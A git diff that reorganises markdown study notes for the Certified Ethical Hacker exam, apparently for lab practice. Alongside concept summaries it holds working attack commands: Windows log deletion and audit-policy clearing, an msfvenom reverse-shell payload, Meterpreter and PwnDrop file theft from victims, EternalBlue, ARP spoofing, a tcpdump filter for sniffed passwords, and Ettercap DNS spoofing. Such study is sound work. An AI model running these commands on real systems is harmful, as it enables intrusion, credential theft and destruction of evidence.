@@ -1,32 +1,46 @@
 # CEH Methodologies & Info
-### 5 Stages in Ethical Hacking: 
-- Perform Recon -> Scanning & Enumeration -> Establishing Access -> Maintaining Access -> Clearing Tracks
-
-### Penetration Testing Life Cycle:
-- Perform Recon -> Scanning & Enumeration -> Establishing Access -> Maintaining Access -> Reporting
-
-### Penetration Testing Types
-- Blackbox (No Knowledge)<br>
-- White Box (Full Knowledge)<br>
-- Gray Box (Partial Knowledge)
 
 ### C.I.A Triad:
 - Confidentiality - Prev. Unauth. Disclosure of Sensitive Data
 - Integrity - Prev. Unauth. Modification of Sensitive Data
 - Availability - Prev. Disruption of Service and Productivity
 
-### Sniffing
-MAC Spoofing - A common low-level security measure is port security. Port security allows only specific MAC addresses access to a switch. The goal is to ensure that only authorized devices have access to the network. A MAC address for a network interface card (NIC) is assigned by the manufacturer. This address is hard-coded directly into the NIC and can’t be changed. However, it is possible to change the MAC address of the interface driver. Let’s say you want to access a network, but the administrator has implemented port security measures. Thanks to your previous reconnaissance and scanning, you know that your target computer has access to the network, and you even know the MAC address. Using one of several software tools, you can spoof your computer’s MAC address to look like the target’s MAC address, and you can connect directly to the network with minimal effort.<br>
+### 5 Stages in Ethical Hacking: 
+- Perform Recon -> Scanning & Enumeration -> Establishing Access -> Maintaining Access -> Clearing Tracks
 
-MAC Flooding - When a switch is initially turned on, it doesn’t know which devices it’s going to be supporting. A switch tracks MAC addresses in a content addressable memory (CAM) table. As it receives packets from various MAC addresses, it adds the addresses to its CAM table and associates each one with a physical port on the switch. This process allows data to be sent directly to the port where the intended recipient is located instead of sending all data across the entire network like a hub. Although one port can have multiple MAC addresses associated with it, the CAM table is only so big. As a hacker, you can use a method called MAC flooding to intentionally flood the CAM table with Ethernet frames, each originating from different MAC addresses. Once the table starts to overflow, the switch responds by broadcasting all incoming data to all ports, basically turning itself into a hub instead of a switch. Since your MAC address is now connected to one of the ports, you are able to capture all traffic as it is broadcast across the network.
-<br>
+### Penetration Testing Life Cycle:
+- Perform Recon -> Scanning & Enumeration -> Establishing Access -> Maintaining Access -> Reporting
 
-ARP Poisoning - Address Resolution Protocol (ARP) maps IP addresses to MAC addresses and provides the most efficient path for data transmission. ARP broadcasts are permitted to freely roam around the network. You can use this free flow of traffic to your advantage. By sending spoofed messages onto a network, you can associate your MAC address with the IP address of another host, preferably the default gateway. As a result, the target machine will send frames to your system, thinking that you are their gateway, before you forward them on to the original destination.
-<br>
+### Penetration Testing/Tester Types
+- Blackbox (No Knowledge)
+- White Box (Full Knowledge)
+- Gray Box (Partial Knowledge)
+- Black Hat 
+- White Hat
+- Gray Hat
 
-Port Mirroring - Port mirroring can be challenging to set up, but is possible depending on the level of access you’ve been able to obtain to a network. The concept behind port mirroring, also known as SPAN port, is actually pretty simple. Port mirroring creates a duplicate of all network traffic on a port and sends it to another device. If all traffic from a target machine is directed through the switch to the server, you can implement port mirroring. Port mirroring ensures that any time the data comes through, it is duplicated and sent out to the attacker’s machine as well.<br>
+# Intro to Pentesting
 
-# Covering Tracks:
+# Social Engineering and Physical Security
+
+# Reconnaissance
+
+# Scanning
+### NMAP
+Detect Promiscuous Mode
+```
+# nmap -sV --script=sniffer-detect <ip address>
+Host script results:
+__sniffer-detect: Likely in promiscuous mode (tests: "111111")
+```
+
+# Enumeration
+
+# Analyze Vulnerabilities
+
+# System Hacking
+
+### Covering Tracks:
 Delete these: 
 ```
 secevent.evt
@@ -62,7 +76,22 @@ N0w if we need to view the System Audit Policy we can do that below and then cle
 > auditpol /get /category:* <br>
 > auditpol /clear /y
 ```
-# Compile C Script
+
+# Malware
+
+# Sniffers, Session Hijacking, and Denial of Service
+### Sniffing
+MAC Spoofing - A common low-level security measure is port security. Port security allows only specific MAC addresses access to a switch. The goal is to ensure that only authorized devices have access to the network. A MAC address for a network interface card (NIC) is assigned by the manufacturer. This address is hard-coded directly into the NIC and can’t be changed. However, it is possible to change the MAC address of the interface driver. Let’s say you want to access a network, but the administrator has implemented port security measures. Thanks to your previous reconnaissance and scanning, you know that your target computer has access to the network, and you even know the MAC address. Using one of several software tools, you can spoof your computer’s MAC address to look like the target’s MAC address, and you can connect directly to the network with minimal effort.<br>
+
+MAC Flooding - When a switch is initially turned on, it doesn’t know which devices it’s going to be supporting. A switch tracks MAC addresses in a content addressable memory (CAM) table. As it receives packets from various MAC addresses, it adds the addresses to its CAM table and associates each one with a physical port on the switch. This process allows data to be sent directly to the port where the intended recipient is located instead of sending all data across the entire network like a hub. Although one port can have multiple MAC addresses associated with it, the CAM table is only so big. As a hacker, you can use a method called MAC flooding to intentionally flood the CAM table with Ethernet frames, each originating from different MAC addresses. Once the table starts to overflow, the switch responds by broadcasting all incoming data to all ports, basically turning itself into a hub instead of a switch. Since your MAC address is now connected to one of the ports, you are able to capture all traffic as it is broadcast across the network.
+<br>
+
+ARP Poisoning - Address Resolution Protocol (ARP) maps IP addresses to MAC addresses and provides the most efficient path for data transmission. ARP broadcasts are permitted to freely roam around the network. You can use this free flow of traffic to your advantage. By sending spoofed messages onto a network, you can associate your MAC address with the IP address of another host, preferably the default gateway. As a result, the target machine will send frames to your system, thinking that you are their gateway, before you forward them on to the original destination.
+<br>
+
+Port Mirroring - Port mirroring can be challenging to set up, but is possible depending on the level of access you’ve been able to obtain to a network. The concept behind port mirroring, also known as SPAN port, is actually pretty simple. Port mirroring creates a duplicate of all network traffic on a port and sends it to another device. If all traffic from a target machine is directed through the switch to the server, you can implement port mirroring. Port mirroring ensures that any time the data comes through, it is duplicated and sent out to the attacker’s machine as well.<br>
+
+### Compile C Script
 Linux
 ```
 > gcc -o shell-exploit shell.c 
@@ -71,7 +100,7 @@ Windows
 ```
 > i686-w64-mingw32-gcc win_script.c -o win_script.exe -lws2_32
 ````
-# msfvenom
+### msfvenom
 MSvenom Basic Reverse TCP Shell
 ```
 > msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe > fileNamed.exe
@@ -92,13 +121,13 @@ C:\> sysinfo
 C:\> download secretFile.txt
 C:\> upload secretPayload.txt
 ```
-# Moving Files
-Samba Share (SMB)<br>
-PwnDrop - ip_address:pwndrop<br>
-SSH/SCP - pretty simple
-Meterpreter
+### Moving Files
+- Samba Share (SMB)
+- PwnDrop - ip_address:pwndrop
+- SSH/SCP - pretty simple
+- Meterpreter
 
-# PwnDrop Usage
+### PwnDrop Usage
 1st - 
 ```
 You need to update the PwnDrop.ini file after install (Configuration to update your IP and Port)
@@ -147,7 +176,8 @@ Go to victim computer -> access ServerIP link (IP Address:pwndrop)
 <br>
 <br>
 12th - Upload any files from Victim to Attacker via PwnDrop.
-# Metasploit
+
+### Metasploit
 Searching: 
 ```
 msf6> search name: eternalblue
@@ -201,18 +231,13 @@ Server username: NT AUTHORITY\SYSTEM
 meterpreter> run post/windows/manage/migrate
 Migrating into 4398 (you now live inside the computer BACKGROUND)
 ```
-# Tools to use for Pentesting:
-ArpSpoof
-<br>
-URLSnarf
-<br>
-MITMF (Man-in-the-middle-framework)
-<br>
-Ettercap
-<br>
+### Tools to use for Pentesting:
+- ArpSpoof
+- URLSnarf
+- MITMF (Man-in-the-middle-framework)
+- Ettercap
 
-# Sniffing
-
+### Sniffing
 DNS Cache Poisoning w/ Ettercap: 
 Attacker poisons ARP table with his MAC | Victim wants to go to Google.com | The attacker spoofs themself as the DNS server | Victim winds up going to a fake Google. <br>
 ```
@@ -253,7 +278,8 @@ Manage Plugins -> dns_spoof
 Globe -> ARP Poisoning
 root# service apache2 start
 ```
-Example:<br>
+Example:
+
 Use Ettercap to begin sniffing and scanning for hosts.
 Set Exec (192.168.0.30) as the target machine
 Initiate DNS spoofing.
@@ -287,14 +313,14 @@ From the task bar, open Chrome.
 In the URL field, type rmksupplies.com and press Enter.
 Notice that the page was redirected to RUS Office Supplies despite the web address not changing.
 ```
-MITM Attack: <br>
-ArpSpoof<br>
-SSLStrip<br>
-Replay Attack<br>
-SSL Downgrade<br>
-DNS Cache Poisoning
+MITM Attack:
+- ArpSpoof
+- SSLStrip
+- Replay Attack
+- SSL Downgrade
+- DNS Cache Poisoning
 
-# ARP Poisoning Attack
+### ARP Poisoning Attack
 Attacker sends his MAC to the victims ARP table and associates that with the Default Gateway. When the Victim wants to go to a domain the attacker receives the request and fowards it through the router to the internet. <br><br>
 Make host act like Router:
 ```
@@ -307,23 +333,23 @@ root# arpspoof -i eth1 -t <target_ip> <destination_gateway>
 ```
 root# tcpdump -i eth1 port http or port ftp -l -A | egrep "pass=|password=|user=|username=|login=|pass:|password:|user:|username:|login:|pass |user |PASS |USER "
 ```
-# TCPDump
+### TCPDump
 You can do this for many things, mainly a CLI like Wireshark. Monitor traffic on the network.
 ```
 root# tcpdump port 21
 listening on eth1
 ```
-# SMAC 2.0 | GUI
+### SMAC 2.0 | GUI
 You can use this for spoofing MAC addresses on a network.
 
 
 
-# Countermeasures for Sniffing
+### Countermeasures for Sniffing
 Write packet capture files from interface 1 into mycap.pcap
 ```
 c:\>windump -i 1 -w C:\test\mycap.pcap
 ```
-# Session Hijacking Process
+### Session Hijacking Process
 Session ID is the key for this to work! | Happens on the Application and Network Layers |
 - Sniff
 - Monitor
@@ -343,19 +369,21 @@ TCP/IP Session Hijacking:
 - Desync client session
 - Take over the session
 
+# IDS, Firewalls, and Honeypots
+
+# Web Servers, Web Applications, and SQL Injections
+
+# WiFi, Bluetooth, and Mobile Devices
+
+# Cloud Computing and Internet of Things
+
+# Cryptography
+
 # Network Access Control Bypass
 
 # John The Ripper
 
 # Hashcat 
-
-# NMAP
-Detect Promiscuous Mode
-```
-# nmap -sV --script=sniffer-detect <ip address>
-Host script results:
-__sniffer-detect: Likely in promiscuous mode (tests: "111111")
-```
 
 # Wireshark
 
